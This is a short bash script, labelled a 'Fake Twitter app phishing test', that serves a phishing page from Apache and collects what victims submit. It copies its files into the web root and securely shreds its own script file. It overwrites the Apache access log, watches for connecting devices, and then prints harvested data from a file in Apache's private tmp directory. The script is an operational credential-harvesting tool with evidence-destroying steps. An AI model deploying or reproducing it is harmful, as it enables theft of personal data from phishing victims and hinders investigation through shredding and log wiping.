#!/bin/bash

bar ()
{
BAR='=  =  =  =  \e[01;32m=  =  =  =  =  \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.04
done
}

echo -e "\e[01;34mFake Twitter app phishing test\e[00m"
sleep 1


pwd > dir.txt
backd=$(cat dir.txt)

cp * /var/www/html
cd /var/www/html
shred -n 7 -u -z twapp.sh > /dev/null
shred -u -z dir.txt > /dev/null
cd $backd

shred -u dir.txt > /dev/null

chown -R root /var/www/html
chmod 755 /var/www/html

service apache2 restart

sleep 2

echo " "
echo -e "\e[00;33mAll data in apache log will be erased, press ENTER\e[00m: "
read
echo "DEVICE CONNECTED: " > /var/log/apache2/access.log
sleep 1
echo " "
xterm -e tail -f /var/log/apache2/access.log &
echo -e "\e[01;32mWhen you see contacts press ENTER\e[00m: "
read 
sleep 2

cd
cd /tmp
ls > prl.txt
cat prl.txt | grep apache2 > ap.txt
dire=$(cat ap.txt)
cd $dire
cd tmp


echo -e "\e[01;32mTracking data...\e[00m"
sleep 0.5
echo -e "\e[00;31m"
bar
echo " "
sleep 0.3
echo " "
echo -e "\e[01;36m"
cat mydata.txt
echo -e "\e[00m"
echo " "
service apache2 stop
echo -e "\e[01;32mFinish\e[00m"

